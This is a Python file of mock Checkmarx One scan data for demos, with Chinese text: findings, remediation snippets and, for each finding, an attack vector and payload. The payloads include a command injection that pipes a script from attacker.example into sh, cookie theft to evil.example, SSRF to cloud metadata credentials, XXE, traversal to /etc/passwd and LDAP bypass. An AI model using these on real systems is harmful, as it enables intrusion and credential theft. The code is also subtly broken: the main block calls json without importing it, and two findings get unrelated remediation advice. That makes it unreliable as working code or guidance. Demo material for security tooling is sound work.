# -*- coding: utf-8 -*-
"""演示用 Checkmarx One 模拟数据（供三套 Demo 共用）。

说明：所有内容均为演示数据，扫描时间以 2026-11-02 为“今天”倒推。
"""

TENANT = {
    "name": "acme",
    "region": "eu",
    "iam": "eu.iam.checkmarx.net",
    "api": "eu.ast.checkmarx.net",
    "web": "https://acme.checkmarx.net",
    "user": "lijing@acme.example",
}

# ---------------------------------------------------------------------------
# 项目 / 扫描
# ---------------------------------------------------------------------------
PROJECTS = [
    {"id": "p-1001", "name": "payment-service", "repo": "git.corp/acme/payment-service", "team": "支付中台", "color": "#2563eb"},
    {"id": "p-1002", "name": "user-center", "repo": "git.corp/acme/user-center", "team": "用户中心", "color": "#7c3aed"},
    {"id": "p-1003", "name": "web-portal", "repo": "git.corp/acme/web-portal", "team": "门户前端", "color": "#0891b2"},
]

SCANS = [
    {"id": "s-1001-a", "projectId": "p-1001", "branch": "main", "createdAt": "2026-10-31T09:12:00+08:00", "duration": "6m 41s", "engine": "SAST"},
    {"id": "s-1001-b", "projectId": "p-1001", "branch": "release/1.8", "createdAt": "2026-10-20T15:40:00+08:00", "duration": "6m 05s", "engine": "SAST"},
    {"id": "s-1002-a", "projectId": "p-1002", "branch": "main", "createdAt": "2026-11-01T14:05:00+08:00", "duration": "4m 22s", "engine": "SAST"},
    {"id": "s-1002-b", "projectId": "p-1002", "branch": "develop", "createdAt": "2026-10-28T10:20:00+08:00", "duration": "4m 18s", "engine": "SAST"},
    {"id": "s-1003-a", "projectId": "p-1003", "branch": "main", "createdAt": "2026-10-30T18:32:00+08:00", "duration": "3m 47s", "engine": "SAST"},
    {"id": "s-1003-b", "projectId": "p-1003", "branch": "develop", "createdAt": "2026-10-18T11:05:00+08:00", "duration": "3m 51s", "engine": "SAST"},
]

# ---------------------------------------------------------------------------
# CWE 参考
# ---------------------------------------------------------------------------
CWE = {
    22: ("路径遍历", "https://owasp.org/www-community/attacks/Path_Traversal"),
    78: ("OS 命令注入", "https://owasp.org/www-community/attacks/Command_Injection"),
    79: ("跨站脚本（XSS）", "https://owasp.org/www-community/attacks/xss/"),
    89: ("SQL 注入", "https://owasp.org/www-community/attacks/SQL_Injection"),
    90: ("LDAP 注入", "https://owasp.org/www-community/attacks/LDAP_Injection"),
    319: ("明文传输敏感数据", "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"),
    327: ("使用已破解或有风险的加密算法", "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"),
    330: ("使用不充分的随机值", "https://owasp.org/www-community/vulnerabilities/Insecure_Randomness"),
    502: ("不可信数据反序列化", "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"),
    532: ("日志中记录敏感信息", "https://cwe.mitre.org/data/definitions/532.html"),
    601: ("开放重定向", "https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"),
    611: ("XML 外部实体（XXE）", "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"),
    798: ("硬编码凭据", "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password"),
    918: ("服务端请求伪造（SSRF）", "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"),
    1321: ("原型污染", "https://owasp.org/www-community/vulnerabilities/Prototype_Pollution"),
}

# ---------------------------------------------------------------------------
# 漏洞类型 → 修复建议（复用）
# ---------------------------------------------------------------------------
REMEDIATION = {
    "SQL Injection": {
        "summary": "始终使用参数化查询或预编译语句，将 SQL 结构与用户输入分离；禁止字符串拼接 SQL。若确实无法参数化，必须使用严格白名单校验。",
        "examples": [{
            "title": "使用 PreparedStatement 参数化查询",
            "lang": "java",
            "bad": 'String sql = "SELECT * FROM payments WHERE order_no = \'" + orderNo + "\'";\nStatement st = conn.createStatement();\nResultSet rs = st.executeQuery(sql);',
            "good": 'String sql = "SELECT * FROM payments WHERE order_no = ?";\nPreparedStatement ps = conn.prepareStatement(sql);\nps.setString(1, orderNo);\nResultSet rs = ps.executeQuery();',
        }],
    },
    "Command Injection": {
        "summary": "避免把外部输入拼接进 shell 命令。优先使用进程 API 的参数数组形式；必须调用 shell 时，对参数做白名单校验并转义。",
        "examples": [{
            "title": "改用 ProcessBuilder 参数列表",
            "lang": "java",
            "bad": 'Runtime.getRuntime().exec("tar -czf /backup/" + request.getParameter("dir") + ".tgz");',
            "good": 'new ProcessBuilder("tar", "-czf", backupFile.toString(), safeDir.toString())\n    .redirectErrorStream(true).start(); // safeDir 已白名单校验',
        }],
    },
    "Path Traversal": {
        "summary": "读取文件前先规范化路径，并校验结果仍位于允许的根目录内；不要直接使用用户提供的文件名拼接路径。",
        "examples": [{
            "title": "normalize 后校验根目录",
            "lang": "java",
            "bad": 'File f = new File("/data/reports/" + request.getParameter("name"));\nreturn Files.readAllBytes(f.toPath());',
            "good": 'Path base = Paths.get("/data/reports").toRealPath();\nPath target = base.resolve(name).normalize().toRealPath();\nif (!target.startsWith(base)) throw new SecurityException("非法路径");',
        }],
    },
    "Stored XSS": {
        "summary": "输出到 HTML 上下文前做编码/转义，优先使用框架自带的输出编码；对富文本使用白名单清洗（如 DOMPurify）。",
        "examples": [{
            "title": "渲染前转义用户内容",
            "lang": "javascript",
            "bad": 'commentBox.innerHTML = "<div>" + comment.content + "</div>";',
            "good": 'commentBox.textContent = comment.content;\n// 或使用 DOMPurify.sanitize(comment.content) 后再插入',
        }],
    },
    "XML External Entity (XXE)": {
        "summary": "禁用外部实体与 DTD 解析，使用安全的 XML 解析器配置；不要解析不可信来源的 XML。",
        "examples": [{
            "title": "关闭 DTD 与外部实体",
            "lang": "java",
            "bad": 'DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();\nDocument doc = f.newDocumentBuilder().parse(inputStream);',
            "good": 'DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();\nf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nf.setFeature("http://xml.org/sax/features/external-general-entities", false);\nf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);',
        }],
    },
    "SSRF": {
        "summary": "对外部 URL 做协议与目标地址白名单校验，禁止访问内网/环回/元数据地址；必要时通过固定出口代理发起请求。",
        "examples": [{
            "title": "校验目标地址与协议",
            "lang": "java",
            "bad": 'URL url = new URL(request.getParameter("callback"));\nHttpURLConnection c = (HttpURLConnection) url.openConnection();',
            "good": 'URI uri = URI.create(callback);\nif (!"https".equals(uri.getScheme()) || isInternalHost(uri.getHost()))\n    throw new IllegalArgumentException("非法回调地址");',
        }],
    },
    "Deserialization of Untrusted Data": {
        "summary": "禁止对不可信数据使用原生反序列化；改用 JSON 等数据格式并校验类型，或使用带类型白名单的 ObjectInputFilter。",
        "examples": [{
            "title": "使用 ObjectInputFilter 白名单",
            "lang": "java",
            "bad": 'ObjectInputStream in = new ObjectInputStream(request.getInputStream());\nObject o = in.readObject();',
            "good": 'ObjectInputStream in = new ObjectInputStream(request.getInputStream());\nin.setObjectInputFilter(ObjectInputFilter.Config.createFilter("com.acme.dto.*;!*"));\nObject o = in.readObject();',
        }],
    },
    "LDAP Injection": {
        "summary": "使用安全的 LDAP 编码工具对过滤条件中的特殊字符转义，或改用参数化的身份查询接口。",
        "examples": [{
            "title": "转义 LDAP 过滤特殊字符",
            "lang": "java",
            "bad": 'String filter = "(uid=" + username + ")";\nctx.search(base, filter, controls);',
            "good": 'String filter = "(uid=" + LdapEncoder.filterEncode(username) + ")";\nctx.search(base, filter, controls);',
        }],
    },
    "Open Redirect": {
        "summary": "重定向目标使用服务端映射的白名单关键字，不要直接使用请求参数中的 URL；跳转前校验域名属于可信列表。",
        "examples": [{
            "title": "使用白名单关键字映射",
            "lang": "java",
            "bad": 'response.sendRedirect(request.getParameter("next"));',
            "good": 'String target = ALLOWED_REDIRECTS.getOrDefault(nextKey, "/home");\nresponse.sendRedirect(target);',
        }],
    },
    "Weak Hash": {
        "summary": "密码存储使用 Argon2/bcrypt/PBKDF2 等慢哈希并加盐；避免 MD5/SHA-1 等已被破解的算法。",
        "examples": [{
            "title": "使用 BCrypt 存储密码",
            "lang": "java",
            "bad": 'String hash = DigestUtils.md5Hex(password);',
            "good": 'String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));\nboolean ok = BCrypt.checkpw(password, hash);',
        }],
    },
    "Hardcoded Password": {
        "summary": "把凭据移到密钥管理服务或环境变量/加密配置中，并定期轮换；仓库中不得出现任何明文口令。",
        "examples": [{
            "title": "从环境变量/密钥服务读取",
            "lang": "java",
            "bad": 'private static final String DB_PASSWORD = "Passw0rd!";',
            "good": 'String dbPassword = vault.read("secret/data/payment-db").get("password");',
        }],
    },
    "Insecure Randomness": {
        "summary": "安全敏感的随机值（Token、验证码、Session ID）必须使用加密安全随机数生成器（CSPRNG）。",
        "examples": [{
            "title": "使用 SecureRandom",
            "lang": "java",
            "bad": 'String token = String.valueOf(new Random().nextLong());',
            "good": 'byte[] buf = new byte[32];\nnew SecureRandom().nextBytes(buf);\nString token = Base64.getUrlEncoder().withoutPadding().encodeToString(buf);',
        }],
    },
    "Sensitive Data in Logs": {
        "summary": "日志中禁止记录口令、令牌、证件号等敏感字段；必要时做脱敏后再输出。",
        "examples": [{
            "title": "日志脱敏",
            "lang": "java",
            "bad": 'log.info("login attempt: user={} password={}", user, password);',
            "good": 'log.info("login attempt: user={} password=***", user);',
        }],
    },
    "Prototype Pollution": {
        "summary": "合并对象时过滤 __proto__、constructor、prototype 等危险键，使用 Object.create(null) 或安全合并库。",
        "examples": [{
            "title": "过滤危险键再合并",
            "lang": "javascript",
            "bad": 'function merge(target, src) {\n  for (const k in src) target[k] = src[k];\n  return target;\n}',
            "good": 'function merge(target, src) {\n  for (const k of Object.keys(src)) {\n    if (["__proto__", "constructor", "prototype"].includes(k)) continue;\n    target[k] = src[k];\n  }\n  return target;\n}',
        }],
    },
    "Missing HSTS": {
        "summary": "在 HTTPS 响应中添加 Strict-Transport-Security 头，并确保所有子域名与 HTTP 请求均重定向到 HTTPS。",
        "examples": [{
            "title": "Nginx 增加 HSTS",
            "lang": "nginx",
            "bad": 'server {\n  listen 443 ssl;\n  server_name portal.acme.example;\n}',
            "good": 'server {\n  listen 443 ssl;\n  server_name portal.acme.example;\n  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;\n}',
        }],
    },
}

# ---------------------------------------------------------------------------
# 漏洞明细
# ---------------------------------------------------------------------------
FINDINGS = [
    {
        "id": "f-001", "projectId": "p-1001", "scanId": "s-1001-a",
        "severity": "HIGH", "cwe": 89, "queryName": "SQL Injection",
        "groupName": "SQL Injection", "language": "Java", "fix": "SQL Injection",
        "file": "src/main/java/com/acme/payment/PaymentServiceImpl.java", "line": 142, "column": 21,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-10-31T09:18:00+08:00",
        "description": "应用将 HTTP 请求参数 orderNo 直接拼接进 SQL 语句并执行，攻击者可构造恶意输入改变查询语义，读取、篡改或删除数据库中的支付订单数据。",
        "attackVector": "攻击者在订单查询接口的 orderNo 参数中注入 SQL 片段，例如：' OR '1'='1' -- 可绕过订单归属校验并返回全部订单；也可使用 UNION 查询读取用户表。",
        "payload": "GET /api/payments?orderNo=1%27%20OR%20%271%27%3D%271%27%20--%20",
        "dataFlow": [
            {"file": "PaymentController.java", "line": 66, "label": "source", "code": "String orderNo = request.getParameter(\"orderNo\");"},
            {"file": "PaymentServiceImpl.java", "line": 139, "label": "propagator", "code": "String sql = \"SELECT * FROM t_payment WHERE order_no = '\" + orderNo + \"'\";"},
            {"file": "PaymentServiceImpl.java", "line": 142, "label": "sink", "code": "stmt.executeQuery(sql);"},
        ],
    },
    {
        "id": "f-002", "projectId": "p-1001", "scanId": "s-1001-a",
        "severity": "MEDIUM", "cwe": 798, "queryName": "Hardcoded Password",
        "groupName": "Credentials Management", "language": "Java", "fix": "Hardcoded Password",
        "file": "src/main/java/com/acme/payment/config/DBConfig.java", "line": 23, "column": 36,
        "state": "CONFIRMED", "status": "RECURRENT", "foundAt": "2026-10-31T09:16:00+08:00",
        "description": "数据库连接口令以明文常量硬编码在源码中，任何可访问仓库的人员都能获取生产数据库凭据，且轮换口令需要重新发版。",
        "attackVector": "攻击者通过代码仓库、制品包反编译或日志泄露获取硬编码口令后，可直接连接数据库进行数据窃取。",
        "payload": "jar -xf payment-service.jar && strings DBConfig.class | grep -i passw",
        "dataFlow": [
            {"file": "DBConfig.java", "line": 23, "label": "source", "code": "private static final String PASSWORD = \"Passw0rd!\";"},
            {"file": "DBConfig.java", "line": 41, "label": "sink", "code": "dataSource.setPassword(PASSWORD);"},
        ],
    },
    {
        "id": "f-003", "projectId": "p-1001", "scanId": "s-1001-a",
        "severity": "MEDIUM", "cwe": 327, "queryName": "Weak Hash",
        "groupName": "Cryptography", "language": "Java", "fix": "Weak Hash",
        "file": "src/main/java/com/acme/payment/util/PasswordUtil.java", "line": 41, "column": 17,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-10-31T09:15:00+08:00",
        "description": "用户口令使用 MD5 加盐哈希存储，MD5 计算速度极快，攻击者可通过 GPU 暴力破解或彩虹表快速还原弱口令。",
        "attackVector": "数据库泄露后，攻击者对 MD5 值离线暴力破解，弱口令可在数分钟内还原，进而撞库登录其他系统。",
        "payload": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
        "dataFlow": [
            {"file": "PasswordUtil.java", "line": 41, "label": "sink", "code": "return DigestUtils.md5Hex(password + salt);"},
        ],
    },
    {
        "id": "f-004", "projectId": "p-1001", "scanId": "s-1001-a",
        "severity": "HIGH", "cwe": 22, "queryName": "Path Traversal",
        "groupName": "Path Traversal", "language": "Java", "fix": "Path Traversal",
        "file": "src/main/java/com/acme/payment/web/FileController.java", "line": 87, "column": 14,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-10-31T09:14:00+08:00",
        "description": "报表下载接口使用请求参数拼接文件路径，未限制在报表目录内，攻击者可通过 ../ 读取服务器任意文件。",
        "attackVector": "攻击者请求 /reports/download?name=../../../../etc/passwd 读取系统文件，或读取应用配置中的数据库口令。",
        "payload": "GET /reports/download?name=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "dataFlow": [
            {"file": "FileController.java", "line": 84, "label": "source", "code": "String name = request.getParameter(\"name\");"},
            {"file": "FileController.java", "line": 87, "label": "sink", "code": "return Files.readAllBytes(Paths.get(REPORT_DIR, name));"},
        ],
    },
    {
        "id": "f-005", "projectId": "p-1001", "scanId": "s-1001-b",
        "severity": "HIGH", "cwe": 918, "queryName": "Server-Side Request Forgery (SSRF)",
        "groupName": "SSRF", "language": "Java", "fix": "SSRF",
        "file": "src/main/java/com/acme/payment/service/WebhookService.java", "line": 203, "column": 9,
        "state": "CONFIRMED", "status": "NEW", "foundAt": "2026-10-20T15:44:00+08:00",
        "description": "Webhook 回调地址由商户输入直接发起服务端请求，未校验目标地址，攻击者可探测内网服务或访问云元数据接口。",
        "attackVector": "商户把回调地址填写为 http://169.254.169.254/latest/meta-data/iam/security-credentials/ ，服务端请求后返回临时云凭据。",
        "payload": "POST /api/webhook/test {\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
        "dataFlow": [
            {"file": "WebhookService.java", "line": 198, "label": "source", "code": "String callback = merchant.getCallbackUrl();"},
            {"file": "WebhookService.java", "line": 203, "label": "sink", "code": "httpClient.send(HttpRequest.newBuilder(URI.create(callback)).build());"},
        ],
    },
    {
        "id": "f-006", "projectId": "p-1002", "scanId": "s-1002-a",
        "severity": "CRITICAL", "cwe": 78, "queryName": "Command Injection",
        "groupName": "Command Injection", "language": "Java", "fix": "Command Injection",
        "file": "src/main/java/com/acme/user/task/BackupTask.java", "line": 71, "column": 12,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-11-01T14:09:00+08:00",
        "description": "后台任务将用户可影响的目录参数拼接进系统命令执行，攻击者可在服务器上执行任意命令，完全控制应用主机。",
        "attackVector": "攻击者触发备份任务并构造 dir 参数为 \"/tmp; curl http://attacker.example/shell.sh | sh\"，即可获得服务器 shell。",
        "payload": "POST /admin/backup {\"dir\":\"/tmp; id > /tmp/pwned\"}",
        "dataFlow": [
            {"file": "BackupTask.java", "line": 66, "label": "source", "code": "String dir = request.getParameter(\"dir\");"},
            {"file": "BackupTask.java", "line": 71, "label": "sink", "code": "Runtime.getRuntime().exec(\"tar -czf /backup/data.tgz \" + dir);"},
        ],
    },
    {
        "id": "f-007", "projectId": "p-1002", "scanId": "s-1002-a",
        "severity": "HIGH", "cwe": 79, "queryName": "Stored XSS",
        "groupName": "Cross-Site Scripting", "language": "JavaScript", "fix": "Stored XSS",
        "file": "src/main/resources/static/js/comment.js", "line": 58, "column": 5,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-11-01T14:08:00+08:00",
        "description": "评论内容未经转义直接写入 innerHTML，攻击者可提交带脚本的评论，在他人浏览页面时窃取会话令牌并冒用身份。",
        "attackVector": "攻击者发布评论 <img src=x onerror=fetch('https://evil.example/?c='+document.cookie)> ，其他用户查看评论列表时脚本执行。",
        "payload": "<img src=x onerror=alert(document.domain)>",
        "dataFlow": [
            {"file": "comment.js", "line": 55, "label": "source", "code": "const content = comment.content;"},
            {"file": "comment.js", "line": 58, "label": "sink", "code": "box.innerHTML = `<li>${content}</li>`;"},
        ],
    },
    {
        "id": "f-008", "projectId": "p-1002", "scanId": "s-1002-a",
        "severity": "CRITICAL", "cwe": 502, "queryName": "Deserialization of Untrusted Data",
        "groupName": "Deserialization", "language": "Java", "fix": "Deserialization of Untrusted Data",
        "file": "src/main/java/com/acme/user/session/SessionUtil.java", "line": 99, "column": 30,
        "state": "CONFIRMED", "status": "NEW", "foundAt": "2026-11-01T14:06:00+08:00",
        "description": "会话对象从请求 Cookie 反序列化，未做类型白名单限制，攻击者可构造恶意序列化链触发远程代码执行。",
        "attackVector": "攻击者使用 ysoserial 生成 CommonsCollections 链的 payload，Base64 后写入 SESSION Cookie，服务端反序列化即执行命令。",
        "payload": "SESSION=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ...",
        "dataFlow": [
            {"file": "SessionUtil.java", "line": 96, "label": "source", "code": "byte[] raw = Base64.getDecoder().decode(cookie.getValue());"},
            {"file": "SessionUtil.java", "line": 99, "label": "sink", "code": "Object o = new ObjectInputStream(new ByteArrayInputStream(raw)).readObject();"},
        ],
    },
    {
        "id": "f-009", "projectId": "p-1002", "scanId": "s-1002-b",
        "severity": "HIGH", "cwe": 90, "queryName": "LDAP Injection",
        "groupName": "LDAP Injection", "language": "Java", "fix": "LDAP Injection",
        "file": "src/main/java/com/acme/user/auth/LdapAuth.java", "line": 112, "column": 18,
        "state": "TO_VERIFY", "status": "RECURRENT", "foundAt": "2026-10-28T10:24:00+08:00",
        "description": "登录接口把用户名直接拼进 LDAP 过滤条件，攻击者可注入 LDAP 语法绕过认证或枚举目录中的用户信息。",
        "attackVector": "攻击者提交用户名 *)(uid=*))(|(uid=* ，构造恒真过滤条件，以任意用户身份通过认证。",
        "payload": "username=*)(uid=*))(|(uid=*&password=whatever",
        "dataFlow": [
            {"file": "LdapAuth.java", "line": 108, "label": "source", "code": "String username = loginForm.getUsername();"},
            {"file": "LdapAuth.java", "line": 112, "label": "sink", "code": "ctx.search(BASE_DN, \"(uid=\" + username + \")\", controls);"},
        ],
    },
    {
        "id": "f-010", "projectId": "p-1002", "scanId": "s-1002-b",
        "severity": "MEDIUM", "cwe": 601, "queryName": "Open Redirect",
        "groupName": "URL Redirection", "language": "Java", "fix": "Open Redirect",
        "file": "src/main/java/com/acme/user/web/LoginController.java", "line": 66, "column": 9,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-10-28T10:23:00+08:00",
        "description": "登录成功后直接跳转到 next 参数指定的地址，攻击者可构造链接把用户引导至钓鱼站点，借助可信域名实施凭据窃取。",
        "attackVector": "攻击者发送 https://user.acme.example/login?next=https://evil.example 给受害者，登录后跳转到仿冒页面。",
        "payload": "GET /login?next=https%3A%2F%2Fevil.example",
        "dataFlow": [
            {"file": "LoginController.java", "line": 63, "label": "source", "code": "String next = request.getParameter(\"next\");"},
            {"file": "LoginController.java", "line": 66, "label": "sink", "code": "response.sendRedirect(next);"},
        ],
    },
    {
        "id": "f-011", "projectId": "p-1002", "scanId": "s-1002-b",
        "severity": "LOW", "cwe": 330, "queryName": "Insecure Randomness",
        "groupName": "Pseudorandom Number Generation", "language": "Java", "fix": "Insecure Randomness",
        "file": "src/main/java/com/acme/user/security/TokenGenerator.java", "line": 31, "column": 22,
        "state": "CONFIRMED", "status": "RECURRENT", "foundAt": "2026-10-28T10:21:00+08:00",
        "description": "密码重置令牌使用 java.util.Random 生成，其种子可预测，攻击者可能推算出其他用户的令牌。",
        "attackVector": "攻击者观察若干令牌后推算 Random 内部状态，预测目标用户的重置令牌并劫持账户。",
        "payload": "seed = System.currentTimeMillis(); new Random(seed).nextLong()",
        "dataFlow": [
            {"file": "TokenGenerator.java", "line": 31, "label": "sink", "code": "return String.valueOf(new Random().nextLong());"},
        ],
    },
    {
        "id": "f-012", "projectId": "p-1003", "scanId": "s-1003-a",
        "severity": "HIGH", "cwe": 611, "queryName": "XML External Entity (XXE)",
        "groupName": "XML Processing", "language": "Java", "fix": "XML External Entity (XXE)",
        "file": "src/main/java/com/acme/portal/xml/XmlParser.java", "line": 74, "column": 16,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-10-30T18:36:00+08:00",
        "description": "门户导入接口解析用户上传的 XML 且未禁用外部实体，攻击者可读取服务器文件或发起 SSRF。",
        "attackVector": "上传包含 <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> 的 XML，解析结果中返回服务器文件内容。",
        "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "dataFlow": [
            {"file": "XmlParser.java", "line": 71, "label": "source", "code": "InputStream in = upload.getInputStream();"},
            {"file": "XmlParser.java", "line": 74, "label": "sink", "code": "Document doc = factory.newDocumentBuilder().parse(in);"},
        ],
    },
    {
        "id": "f-013", "projectId": "p-1003", "scanId": "s-1003-a",
        "severity": "INFO", "cwe": 319, "queryName": "Missing HSTS Header",
        "groupName": "Insecure Transport", "language": "Nginx", "fix": "Missing HSTS",
        "file": "deploy/nginx/portal.conf", "line": 12, "column": 1,
        "state": "IGNORED", "status": "RECURRENT", "foundAt": "2026-10-30T18:35:00+08:00",
        "description": "站点未返回 Strict-Transport-Security 响应头，在首次访问或证书配置异常时存在降级到 HTTP 明文传输的风险。",
        "attackVector": "攻击者在公共 Wi-Fi 环境下实施 SSL Strip，将用户 HTTP 请求劫持并窃取会话 Cookie。",
        "payload": "curl -sI https://portal.acme.example | grep -i strict-transport-security",
        "dataFlow": [],
    },
    {
        "id": "f-014", "projectId": "p-1003", "scanId": "s-1003-a",
        "severity": "MEDIUM", "cwe": 1321, "queryName": "Prototype Pollution",
        "groupName": "Client-Side Injection", "language": "JavaScript", "fix": "Prototype Pollution",
        "file": "src/utils/merge.js", "line": 44, "column": 5,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-10-30T18:34:00+08:00",
        "description": "对象深合并工具未过滤 __proto__ 等特殊键，攻击者可通过恶意 JSON 污染 Object.prototype，导致前端逻辑被绕过。",
        "attackVector": "攻击者提交 {\"__proto__\":{\"isAdmin\":true}} 给合并接口，后续所有对象继承 isAdmin=true，绕过前端权限判断。",
        "payload": "{\"__proto__\":{\"isAdmin\":true},\"name\":\"guest\"}",
        "dataFlow": [
            {"file": "merge.js", "line": 40, "label": "source", "code": "const payload = JSON.parse(body);"},
            {"file": "merge.js", "line": 44, "label": "sink", "code": "target[key] = merge(target[key], src[key]);"},
        ],
    },
    {
        "id": "f-015", "projectId": "p-1003", "scanId": "s-1003-b",
        "severity": "LOW", "cwe": 532, "queryName": "Sensitive Data in Logs",
        "groupName": "Information Exposure", "language": "Java", "fix": "Sensitive Data in Logs",
        "file": "src/main/java/com/acme/portal/audit/AuditLogger.java", "line": 188, "column": 9,
        "state": "CONFIRMED", "status": "NEW", "foundAt": "2026-10-18T11:09:00+08:00",
        "description": "审计日志把登录请求的明文口令写入日志文件，具备日志读取权限的人员可直接获取用户凭据。",
        "attackVector": "攻击者获取日志服务器只读权限后，从日志中检索 password= 字段批量收集用户口令。",
        "payload": "grep -o 'password=[^&]*' /var/log/portal/access.log",
        "dataFlow": [
            {"file": "AuditLogger.java", "line": 185, "label": "source", "code": "String password = loginForm.getPassword();"},
            {"file": "AuditLogger.java", "line": 188, "label": "sink", "code": "audit.info(\"login user={} password={}\", user, password);"},
        ],
    },
    {
        "id": "f-016", "projectId": "p-1003", "scanId": "s-1003-b",
        "severity": "HIGH", "cwe": 89, "queryName": "SQL Injection",
        "groupName": "SQL Injection", "language": "Java", "fix": "SQL Injection",
        "file": "src/main/java/com/acme/portal/dao/ReportDao.java", "line": 63, "column": 14,
        "state": "TO_VERIFY", "status": "NEW", "foundAt": "2026-10-18T11:08:00+08:00",
        "description": "报表查询按用户输入的排序字段拼接 ORDER BY 子句，未做白名单校验，可被注入任意 SQL。",
        "attackVector": "攻击者在 sort 参数中注入 (CASE WHEN (SELECT substr(password,1,1) FROM users LIMIT 1)='a' THEN id ELSE name END)，基于排序结果进行盲注。",
        "payload": "GET /reports/list?sort=id%20DESC%2C%20(SELECT%20...%20)",
        "dataFlow": [
            {"file": "ReportDao.java", "line": 60, "label": "source", "code": "String sort = request.getParameter(\"sort\");"},
            {"file": "ReportDao.java", "line": 63, "label": "sink", "code": "jdbcTemplate.query(\"SELECT * FROM reports ORDER BY \" + sort, mapper);"},
        ],
    },
]

# 本地扫描（演示）完成后注入的漏洞
LOCAL_SCAN_FINDINGS = [
    {
        "severity": "HIGH", "cwe": 798, "queryName": "Hardcoded API Key", "groupName": "Credentials Management",
        "language": "JavaScript", "fix": "Hardcoded Password",
        "file": "src/config/api.js", "line": 12, "column": 15,
        "description": "前端代码中硬编码了第三方 API Key，随构建产物发布后可被任意访问者提取。",
        "attackVector": "攻击者下载前端 JS 产物，搜索 AIza 等特征字符串即可拿到 API Key 并滥用配额。",
        "payload": "grep -oE 'AIza[0-9A-Za-z_-]{35}' dist/assets/*.js",
        "dataFlow": [{"file": "api.js", "line": 12, "label": "sink", "code": "const API_KEY = 'AIzaSyD-xxxx';"}],
    },
    {
        "severity": "MEDIUM", "cwe": 1004, "queryName": "Insecure Cookie", "groupName": "Cookie Security",
        "language": "JavaScript", "fix": "Sensitive Data in Logs",
        "file": "src/session/cookie.js", "line": 28, "column": 3,
        "description": "会话 Cookie 未设置 HttpOnly 与 Secure 属性，可被脚本读取并在 HTTP 连接中泄露。",
        "attackVector": "结合 XSS 漏洞，攻击者可通过 document.cookie 读取会话令牌并劫持用户会话。",
        "payload": "document.cookie",
        "dataFlow": [{"file": "cookie.js", "line": 28, "label": "sink", "code": "document.cookie = `sid=${token}`;"}],
    },
    {
        "severity": "LOW", "cwe": 489, "queryName": "Debug Mode Enabled", "groupName": "Configuration",
        "language": "YAML", "fix": "Missing HSTS",
        "file": "config/application.yml", "line": 8, "column": 3,
        "description": "生产配置开启了框架调试模式，异常时可能向访问者暴露堆栈、源码路径与环境变量。",
        "attackVector": "攻击者构造异常请求触发错误页，从堆栈信息中获取内部路径与依赖版本，为后续攻击做准备。",
        "payload": "GET /api/not-exist",
        "dataFlow": [],
    },
]


def build():
    """合并修复建议/CWE 参考，返回可直接 JSON 序列化的字典。"""
    import json
    findings = []
    for f in FINDINGS:
        item = dict(f)
        rem = dict(REMEDIATION[item["fix"]])
        cwe_name, owasp = CWE[item["cwe"]]
        refs = [
            {"label": "CWE-%d：%s" % (item["cwe"], cwe_name),
             "url": "https://cwe.mitre.org/data/definitions/%d.html" % item["cwe"]},
            {"label": "OWASP 参考", "url": owasp},
            {"label": "Checkmarx 查询帮助", "url": "https://docs.checkmarx.com"},
        ]
        rem["refs"] = refs
        item["remediation"] = rem
        item["cweName"] = cwe_name
        findings.append(item)

    local = []
    for i, f in enumerate(LOCAL_SCAN_FINDINGS, 1):
        item = dict(f)
        rem = dict(REMEDIATION[item["fix"]])
        cwe_name, owasp = CWE.get(item["cwe"], ("安全配置", "https://cwe.mitre.org/"))
        item["cweName"] = cwe_name
        item["remediation"] = {
            "summary": rem["summary"], "examples": rem["examples"],
            "refs": [
                {"label": "CWE-%d：%s" % (item["cwe"], cwe_name),
                 "url": "https://cwe.mitre.org/data/definitions/%d.html" % item["cwe"]},
                {"label": "OWASP 参考", "url": owasp},
            ],
        }
        item["id"] = "local-%02d" % i
        local.append(item)

    return {
        "tenant": TENANT,
        "projects": PROJECTS,
        "scans": SCANS,
        "findings": findings,
        "localScanFindings": local,
    }


if __name__ == "__main__":
    print(json.dumps(build(), ensure_ascii=False, indent=2))